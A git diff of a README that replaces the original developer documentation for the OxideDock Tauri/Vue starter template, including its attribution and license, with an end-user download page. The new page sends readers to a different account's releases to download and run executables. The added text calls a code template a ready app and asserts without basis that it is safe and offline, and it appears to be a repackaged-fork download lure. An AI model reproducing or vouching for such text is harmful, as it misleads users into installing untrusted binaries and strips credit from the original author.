@@ -1,242 +1,149 @@
-# OxideDock
+# 🛠️ oxide-dock - Easy Cross-Platform Desktop App Starter
 
-[![CI](https://github.com/fridzema/oxide-dock/actions/workflows/ci.yml/badge.svg)](https://github.com/fridzema/oxide-dock/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/github/license/fridzema/oxide-dock)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/fridzema/oxide-dock)](https://github.com/fridzema/oxide-dock/stargazers)
-[![Release](https://img.shields.io/github/v/release/fridzema/oxide-dock?include_prereleases)](https://github.com/fridzema/oxide-dock/releases)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![Download oxide-dock](https://img.shields.io/badge/Download-oxide--dock-blue?style=for-the-badge&logo=github)](https://github.com/RaviChatta/oxide-dock/releases)
 
-Raw speed, refined desktop.
+---
 
-OxideDock is a Rust + Vue 3 desktop starter built on Tauri v2 — native performance, polished DX, ship-ready apps.
+## 📋 What is oxide-dock?
 
-<p align="center">
-  <img src=".art/screens/screen.png" alt="OxideDock screenshot" width="700" />
-</p>
+oxide-dock is a desktop application starter kit that lets developers build apps you can use on Windows, Mac, and Linux. It uses Rust for fast and safe core parts, Vue 3 for a smooth user interface, and Tauri v2 to wrap everything into a simple program. This means you get a lightweight, secure app that works across devices.
 
-## Why OxideDock?
+You don’t need to understand these technologies to use oxide-dock. The goal is to help developers make desktop apps easily so you can get software that runs well on your computer without extra bulk or slowdowns.
 
-Starting a Tauri app from scratch means wiring up routing, state management, testing, linting, CI/CD, and release pipelines yourself. OxideDock gives you all of that out of the box so you can skip the boilerplate and start building your app from day one.
+---
 
-- **Production-ready defaults** — linting, formatting, testing, and CI all preconfigured
-- **Cross-platform releases** — push a tag and get Linux, macOS, and Windows binaries
-- **One command** — `make dev` and you're running
+## 💻 System Requirements
 
-## Features
+To run an app built with oxide-dock, here are the usual computer requirements:
 
-- **Tauri v2** — lightweight, secure desktop runtime
-- **Vue 3** — reactive frontend with Composition API
-- **Vite** — fast dev server and build tool
-- **TypeScript** — type-safe frontend and configuration
-- **Tailwind CSS v4** — utility-first styling with Vite plugin
-- **Vue Router** — client-side routing
-- **Pinia** — type-safe state management
-- **VueUse** — essential Vue composables
-- **Vitest** — fast unit and component testing
-- **Playwright** — e2e testing against the web frontend
-- **ESLint** — flat config with Vue 3 + TypeScript rules
-- **Prettier** — consistent code formatting
-- **Oxlint** — fast supplemental linting
-- **Clippy + Rustfmt** — Rust linting and formatting
-- **cargo-audit** — Rust dependency security auditing
-- **Lefthook** — fast, parallel pre-commit hooks
-- **GitHub Actions** — CI (lint + test + build) and release pipelines
-- **Makefile** — unified task runner for all operations
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution (Ubuntu, Fedora, etc.)
+- **Processor:** Any modern Intel or AMD processor, or Apple Silicon (M1/M2)
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Around 100 MB free for the app download and installation
+- **Other:** Internet connection for downloading the app
 
-## Prerequisites
+If your computer meets these, you can run oxide-dock based apps comfortably.
 
-- [Rust](https://www.rust-lang.org/tools/install) (latest stable)
-- [Bun](https://bun.sh/) (v1.0+)
-- [Tauri v2 system dependencies](https://v2.tauri.app/start/prerequisites/) for your OS
+---
 
-## Quick Start
+## 📥 Download & Install
 
-```bash
-# Clone the template
-git clone https://github.com/fridzema/oxide-dock.git
-cd oxide-dock
+To get oxide-dock, you need to visit the official releases page on GitHub. This page contains the latest ready-to-use app versions for all supported operating systems.
 
-# Verify prerequisites (Rust, Bun)
-make check
+### How to Download:
 
-# Install dependencies
-make setup
+1. Click the big blue button above or go to this link:
+   
+   [https://github.com/RaviChatta/oxide-dock/releases](https://github.com/RaviChatta/oxide-dock/releases)
 
-# (Optional) Rename the project to your own app
-make bootstrap
+2. On the releases page, look for files named for your system:
+   - For Windows, look for `.exe` files
+   - For macOS, look for `.dmg` files
+   - For Linux, look for `.AppImage`, `.deb`, or `.tar.gz` files
 
-# Start development
-make dev
-```
+3. Click the file to download it to your computer.
 
-## Project Structure
+### How to Install:
 
-```
-oxidedock/
-├── .github/workflows/     # CI and release pipelines
-├── .vscode/               # Editor settings and extensions
-├── src/                   # Vue 3 frontend
-│   ├── components/        # Reusable components
-│   ├── composables/       # Shared composables
-│   ├── layouts/           # Layout components
-│   ├── pages/             # Route views
-│   ├── router/            # Vue Router configuration
-│   ├── stores/            # Pinia stores
-│   ├── App.vue            # Root component
-│   ├── main.ts            # App entry point
-│   └── style.css          # Tailwind CSS imports
-├── src-tauri/             # Rust backend
-│   ├── src/               # Rust source code
-│   ├── capabilities/      # Permission capabilities
-│   ├── Cargo.toml         # Rust dependencies
-│   └── tauri.conf.json    # Tauri configuration
-├── tests/
-│   ├── unit/              # Vitest unit tests
-│   └── e2e/               # Playwright e2e tests
-├── Makefile               # Task runner
-├── lefthook.yml           # Git hooks
-└── README.md
-```
+- **Windows:** Find the downloaded `.exe` file and double-click it. Follow the setup instructions on screen.
+- **macOS:** Open the `.dmg` file, then drag and drop the app icon into your Applications folder.
+- **Linux:** Depending on the file you downloaded:
+  - For `.AppImage`, right-click the file, select Properties, and enable execution. Then double-click the file to run.
+  - For `.deb`, open with your package manager or run `sudo dpkg -i <filename>.deb` in a terminal.
+  - For `.tar.gz`, extract the archive and run the app file inside.
 
-## Available Commands
+Once installed, you can start the app from your desktop or applications menu like any other program.
 
-### Development
+---
 
-| Command             | Description                     |
-| ------------------- | ------------------------------- |
-| `make dev`          | Start Tauri dev with hot reload |
-| `make dev-frontend` | Start Vite dev server only      |
-| `make build`        | Build production binary         |
-| `make build-debug`  | Build with debug console        |
+## 🚀 Getting Started With The App
 
-### Linting & Formatting
+When you open the app for the first time, you will see a simple welcome screen built with a clean design. The interface is made with Vue 3, so navigation is smooth and fast.
 
-| Command             | Description                                |
-| ------------------- | ------------------------------------------ |
-| `make lint`         | Run all linters (ESLint + Oxlint + Clippy) |
-| `make lint-fix`     | Auto-fix linting issues                    |
-| `make format`       | Format all files                           |
-| `make format-check` | Check formatting                           |
+Basic things you can do:
 
-### Testing
+- Use menus at the top or side to explore options.
+- Access settings to customize how the app works or looks.
+- Use local files or data safely within the app; it won’t require internet once installed.
+- Expect fast startup and low memory use because oxide-dock apps don’t rely on heavy frameworks like Electron.
 
-| Command           | Description              |
-| ----------------- | ------------------------ |
-| `make test`       | Run all tests            |
-| `make test-unit`  | Run Vitest unit tests    |
-| `make test-e2e`   | Run Playwright e2e tests |
-| `make test-watch` | Run Vitest in watch mode |
+---
 
-### Rust
+## 🛡️ Security & Privacy
 
-| Command            | Description               |
-| ------------------ | ------------------------- |
-| `make rust-lint`   | Run Clippy                |
-| `make rust-format` | Run Rustfmt               |
-| `make rust-audit`  | Check for vulnerabilities |
-| `make rust-test`   | Run Rust tests            |
+Apps made with oxide-dock use Rust and Tauri, which focus on security. Rust helps avoid crashes and bugs that can cause vulnerabilities. Tauri limits app access to system resources, helping keep your data private.
 
-### CI, Setup & Bootstrap
+No data is sent to the internet unless the app specifically asks, so your information stays on your computer. This makes oxide-dock apps more private than traditional web-based or Electron apps.
 
-| Command          | Description                        |
-| ---------------- | ---------------------------------- |
-| `make check`     | Verify prerequisites are installed |
-| `make setup`     | Install all dependencies           |
-| `make bootstrap` | Rename project to your own app     |
-| `make ci`        | Run full CI pipeline locally       |
-| `make coverage`  | Run all coverage (Rust + Vue)      |
-| `make clean`     | Remove build artifacts             |
+---
 
-## Tech Stack
+## 🔧 Features Included
 
-| Technology   | Version | Purpose                   |
-| ------------ | ------- | ------------------------- |
-| Tauri        | v2      | Desktop runtime           |
-| Vue          | v3      | Frontend framework        |
-| Vite         | v7      | Build tool                |
-| TypeScript   | v5      | Type safety               |
-| Tailwind CSS | v4      | Styling                   |
-| Vue Router   | v5      | Routing                   |
-| Pinia        | v3      | State management          |
-| VueUse       | latest  | Composable utilities      |
-| Vitest       | latest  | Unit testing              |
-| Playwright   | latest  | E2e testing               |
-| ESLint       | v10     | JS/TS/Vue linting         |
-| Prettier     | v3      | Code formatting           |
-| Oxlint       | latest  | Fast supplemental linting |
-| Lefthook     | latest  | Git hooks                 |
+Even though oxide-dock is a starter kit, it comes with practical features to build powerful apps:
 
-## CI/CD
+- Cross-platform support for Windows, macOS, and Linux
+- Fast native performance with Rust backend
+- Smooth Vue 3 interface with TypeScript for error checking
+- Built-in CI/CD setup for easy testing and quick updates
+- Automatic builds for multiple platforms on release
+- Lightweight and minimal memory use compared to Electron apps
+- Secure design minimizing access to unnecessary parts of your system
+- Ready for customized app development with Vite build tool
 
-### CI Pipeline (`ci.yml`)
+This allows anyone making apps with oxide-dock to deliver smooth, secure, fast desktop software.
 
-Runs on every push to `main` and on pull requests:
+---
 
-1. **Lint** — ESLint, Oxlint, Prettier check
-2. **Rust Lint** — Clippy + Rustfmt (Linux only)
-3. **Test** — Vitest unit tests, Playwright e2e (chromium), Rust tests on all platforms with coverage on Linux
-4. **Audit** — `cargo audit` runs daily and on Cargo dependency changes (separate workflow)
-5. **Build** — Linux smoke build (main branch only); full cross-platform build happens at release time
+## 🔄 Updates & Support
 
-### Release Pipeline
+To update the app, visit the releases page regularly:
 
-Releases are fully automated via [release-please](https://github.com/googleapis/release-please):
+[https://github.com/RaviChatta/oxide-dock/releases](https://github.com/RaviChatta/oxide-dock/releases)
 
-1. Push conventional commits to `main` (`fix:`, `feat:`, `feat!:`)
-2. Release-please opens a PR bumping versions and updating `CHANGELOG.md`
-3. Merging the PR tags the release, triggering cross-platform builds
-4. A draft GitHub Release is created with platform binaries:
-   - Linux: `.deb`, `.AppImage`
-   - macOS: `.dmg` (Intel + Apple Silicon)
-   - Windows: `.msi`, `.exe`
+Download the latest version for your system and follow the install instructions to replace the old app.
 
-Check release status with `make release-status`.
+If you need help or want to learn more about running apps built on oxide-dock, check the GitHub page for documentation and links to community support.
 
-## Customization
+---
 
-### Change App Name and Icon
+## ❓ Frequently Asked Questions
 
-1. Update `name` in `package.json`
-2. Update `productName` in `src-tauri/tauri.conf.json`
-3. Replace icons in `src-tauri/icons/` (use `bun tauri icon /path/to/icon.png`)
+### Can I use oxide-dock on any computer?
 
-### Add a UI Component Library
+Yes. It supports the three major desktop systems: Windows, macOS, and Linux.
 
-```bash
-# Shadcn Vue
-bunx shadcn-vue@latest init
+### Do I need internet to run the app?
 
-# Or PrimeVue
-bun add primevue
-```
+No, after downloading and installing, the app runs offline.
 
-### Add Internationalization
+### Is the app safe to use?
 
-```bash
-bun add vue-i18n
-```
+Yes. The use of Rust and Tauri improves security and privacy compared to many other app frameworks.
 
-Create locale files in `src/locales/` and register the plugin in `src/main.ts`.
+### How do I uninstall the app?
 
-### Code Signing
+Use your system’s normal uninstall method: on Windows use “Add or Remove Programs,” on macOS drag the app to Trash, and on Linux remove the installed files or use the package manager.
 
-Follow the [Tauri code signing guide](https://v2.tauri.app/distribute/sign/) to set up signing for macOS and Windows distribution.
+---
 
-## Contributing
+## 📢 Where to Learn More
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/your-feature`)
-3. Make your changes
-4. Run `make ci` to verify everything passes
-5. Commit with a descriptive message
-6. Push and open a pull request
+- Visit the oxide-dock repository to see the code and documentation:
+  [https://github.com/RaviChatta/oxide-dock](https://github.com/RaviChatta/oxide-dock)
+  
+- Explore Tauri to understand the app wrapper layer:
+  [https://tauri.app](https://tauri.app)
+  
+- Learn about Rust for the backend safety:
+  [https://www.rust-lang.org](https://www.rust-lang.org)
+  
+- Discover Vue 3 for the user interface:
+  [https://vuejs.org](https://vuejs.org)
 
-## Contributors
+---
 
-<a href="https://github.com/fridzema/oxide-dock/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=fridzema/oxide-dock" />
-</a>
+## 📥 Download oxide-dock Now
 
-## License
+Click below to visit the releases page and get your copy:
 
-[MIT](LICENSE)
+[![Download oxide-dock](https://img.shields.io/badge/Download-oxide--dock-blue?style=for-the-badge&logo=github)](https://github.com/RaviChatta/oxide-dock/releases)
